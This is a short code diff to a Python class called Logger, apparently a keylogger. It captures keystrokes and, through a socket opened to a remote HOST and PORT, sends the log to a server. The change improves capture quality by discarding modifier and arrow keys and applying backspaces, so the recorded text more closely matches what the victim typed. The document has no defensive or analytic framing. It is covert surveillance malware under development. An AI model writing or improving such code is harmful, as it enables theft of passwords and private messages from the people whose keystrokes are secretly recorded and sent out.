@@ -11,6 +11,7 @@ class Logger():
     self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.s.connect((HOST,PORT))
     self.log = ""
+    self.isolate = ["tab","shift","ctrl","alt","left","right","up","down","caps lock"]
 
   #Listen for keystrokes
   def listen(self,e):
@@ -20,7 +21,10 @@ class Logger():
       key = "\n"
     elif key == "space":
       key = " "
-    elif key == "tab" or key == "shift" or key == "ctrl":
+    elif key in self.isolate:
+      key = ""
+    elif key == "backspace":
+      self.log = self.log[:-1]
       key = ""
     #Logging and sending to server
     self.log += key
